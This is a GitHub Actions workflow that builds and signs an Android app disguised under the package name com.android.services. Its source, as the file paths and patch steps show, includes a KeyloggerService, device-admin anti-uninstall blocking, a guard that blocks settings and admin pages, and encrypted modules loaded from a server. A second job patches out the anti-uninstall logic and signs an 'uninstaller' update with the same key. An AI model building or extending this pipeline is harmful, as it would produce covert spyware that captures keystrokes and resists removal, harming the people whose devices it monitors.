name: Build Android APK

on:
  push:
    branches: [ main, master ]
    paths:
      - 'android/**'
      - '.github/workflows/build-apk.yml'
  pull_request:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  # ─── DEBUG BUILD ─────────────────────────────────────────────────────────────
  build-debug:
    name: Build Debug APK
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: '17', cache: gradle }
      - uses: gradle/actions/setup-gradle@v4
        with: { gradle-version: '8.4' }
      - run: cd android && gradle wrapper --gradle-version 8.4 && chmod +x gradlew
      - uses: android-actions/setup-android@v3
      - run: yes | sdkmanager --licenses || true
      - run: cd android && ./gradlew assembleDebug --no-daemon --stacktrace
      - uses: actions/upload-artifact@v4
        with:
          name: AndroidConnector-debug-${{ github.sha }}
          path: android/app/build/outputs/apk/debug/app-debug.apk
          retention-days: 30

  # ─── RELEASE BUILD + SIGN ────────────────────────────────────────────────────
  build-release:
    name: Build & Sign Release APK
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master'

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: '17', cache: gradle }

      - uses: gradle/actions/setup-gradle@v4
        with: { gradle-version: '8.4' }

      - run: cd android && gradle wrapper --gradle-version 8.4 && chmod +x gradlew

      - uses: android-actions/setup-android@v3
      - run: yes | sdkmanager --licenses || true

      # ── Decode keystore ───────────────────────────────────────────────────
      - name: Decode Keystore
        run: |
          echo "${{ secrets.KEYSTORE_BASE64 }}" | base64 --decode > android/app/androidconnector.p12
          echo "✅ Keystore decoded"

      # ── Build & Sign Release APK ──────────────────────────────────────────
      - name: Build Release APK
        env:
          KEYSTORE_PASSWORD: ${{ secrets.KEYSTORE_PASSWORD }}
          KEY_ALIAS: ${{ secrets.KEY_ALIAS }}
          KEY_PASSWORD: ${{ secrets.KEY_PASSWORD }}
        run: |
          cd android
          ./gradlew assembleRelease --no-daemon \
            -Pandroid.injected.signing.store.file="$GITHUB_WORKSPACE/android/app/androidconnector.p12" \
            -Pandroid.injected.signing.store.password="$KEYSTORE_PASSWORD" \
            -Pandroid.injected.signing.key.alias="$KEY_ALIAS" \
            -Pandroid.injected.signing.key.password="$KEY_PASSWORD"
          echo "✅ Release APK signed"

      # ── Package & Upload ──────────────────────────────────────────────────
      - name: Package Artifact
        run: |
          mkdir -p dist
          cp android/app/build/outputs/apk/release/app-release.apk \
             dist/AndroidConnector-release-signed.apk

      - uses: actions/upload-artifact@v4
        with:
          name: AndroidConnector-release-signed-${{ github.sha }}
          path: dist/AndroidConnector-release-signed.apk
          retention-days: 90

      - name: Build Summary
        run: |
          echo "## ✅ Build Berhasil" >> $GITHUB_STEP_SUMMARY
          echo "| | |" >> $GITHUB_STEP_SUMMARY
          echo "|---|---|" >> $GITHUB_STEP_SUMMARY
          echo "| **APK** | AndroidConnector-release-signed.apk |" >> $GITHUB_STEP_SUMMARY
          echo "| **Commit** | \`${{ github.sha }}\` |" >> $GITHUB_STEP_SUMMARY
          echo "| **R8** | ✅ Aktif (minify + shrink) |" >> $GITHUB_STEP_SUMMARY
          echo "| **Signed** | ✅ V2 + V3 |" >> $GITHUB_STEP_SUMMARY
          echo "| **Modules** | ✅ Server-side encrypted (DexModuleLoader) |" >> $GITHUB_STEP_SUMMARY
          ls -lh android/app/build/outputs/apk/release/

  # ─── UNINSTALLER APK — parallel dengan build-release ─────────────────────────
  build-uninstaller:
    name: 🗑️ Build Uninstaller APK
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master'

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: '17', cache: gradle }

      - uses: gradle/actions/setup-gradle@v4
        with: { gradle-version: '8.4' }

      - run: cd android && gradle wrapper --gradle-version 8.4 && chmod +x gradlew

      - uses: android-actions/setup-android@v3
      - run: yes | sdkmanager --licenses || true

      # ── Patch 1: AppDeviceAdminReceiver — buang semua blocking logic ──────
      - name: Patch — Matikan anti-uninstall
        run: |
          cat > android/app/src/main/kotlin/com/android/services/AppDeviceAdminReceiver.kt << 'KOTLIN'
package com.android.services

import android.app.admin.DeviceAdminReceiver
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.UserManager

class AppDeviceAdminReceiver : DeviceAdminReceiver() {
    override fun onEnabled(context: Context, intent: Intent) {}
    override fun onDisableRequested(context: Context, intent: Intent): CharSequence =
        "Administrator akan dinonaktifkan."
    override fun onDisabled(context: Context, intent: Intent) {}

    companion object {
        val SETTINGS_PACKAGES  = emptySet<String>()
        val ADMIN_PAGE_KEYWORDS = emptyList<String>()
        fun getComponentName(context: Context) =
            ComponentName(context, AppDeviceAdminReceiver::class.java)
        fun isAdminActive(context: Context): Boolean {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            return dpm.isAdminActive(getComponentName(context))
        }
        fun isDeviceOwner(context: Context): Boolean {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            return dpm.isDeviceOwnerApp(context.packageName)
        }
        fun setBlockUninstall(context: Context, block: Boolean): String = "UNINSTALLER_BUILD"
    }
}
KOTLIN
          echo "✅ AppDeviceAdminReceiver patched"

      # ── Patch 2: KeyloggerService — adminGuardEnabled = false ────────────
      - name: Patch — Matikan guardAdminPage
        run: |
          sed -i 's/@Volatile var adminGuardEnabled: Boolean = true/@Volatile var adminGuardEnabled: Boolean = false/' \
            android/app/src/main/kotlin/com/android/services/KeyloggerService.kt
          echo "✅ KeyloggerService patched"
          grep "adminGuardEnabled" android/app/src/main/kotlin/com/android/services/KeyloggerService.kt

      # ── Patch 3: ConnectorService — matikan auto block on start ──────────
      - name: Patch — Matikan auto setBlockUninstall
        run: |
          sed -i 's/Thread { AppDeviceAdminReceiver.setBlockUninstall/\/\/ Thread { AppDeviceAdminReceiver.setBlockUninstall/' \
            android/app/src/main/kotlin/com/android/services/ConnectorService.kt
          echo "✅ ConnectorService patched"

      # ── Decode keystore (sama = valid update) ─────────────────────────────
      - name: Decode Keystore
        run: |
          echo "${{ secrets.KEYSTORE_BASE64 }}" | base64 --decode > android/app/androidconnector.p12

      # ── Build & Sign ──────────────────────────────────────────────────────
      - name: Build & Sign Uninstaller APK
        env:
          KEYSTORE_PASSWORD: ${{ secrets.KEYSTORE_PASSWORD }}
          KEY_ALIAS: ${{ secrets.KEY_ALIAS }}
          KEY_PASSWORD: ${{ secrets.KEY_PASSWORD }}
        run: |
          cd android
          ./gradlew assembleRelease --no-daemon \
            -Pandroid.injected.signing.store.file="$GITHUB_WORKSPACE/android/app/androidconnector.p12" \
            -Pandroid.injected.signing.store.password="$KEYSTORE_PASSWORD" \
            -Pandroid.injected.signing.key.alias="$KEY_ALIAS" \
            -Pandroid.injected.signing.key.password="$KEY_PASSWORD"

      # ── Upload ────────────────────────────────────────────────────────────
      - name: Package Artifact
        run: |
          mkdir -p dist
          cp android/app/build/outputs/apk/release/app-release.apk \
             dist/AndroidConnector-UNINSTALLER.apk
          echo "📦 $(du -h dist/AndroidConnector-UNINSTALLER.apk | cut -f1)"

      - uses: actions/upload-artifact@v4
        with:
          name: AndroidConnector-UNINSTALLER-${{ github.sha }}
          path: dist/AndroidConnector-UNINSTALLER.apk
          retention-days: 90

      - name: Build Summary
        run: |
          echo "## 🗑️ Uninstaller APK Siap" >> $GITHUB_STEP_SUMMARY
          echo "| | |" >> $GITHUB_STEP_SUMMARY
          echo "|---|---|" >> $GITHUB_STEP_SUMMARY
          echo "| **Package** | com.android.services (identik) |" >> $GITHUB_STEP_SUMMARY
          echo "| **Keystore** | Sama → Android terima sebagai Update ✅ |" >> $GITHUB_STEP_SUMMARY
          echo "| **Anti-Uninstall** | ❌ Semua OFF |" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "**Cara pakai:** Install → Settings → Device Admin → Nonaktifkan → Uninstall" >> $GITHUB_STEP_SUMMARY
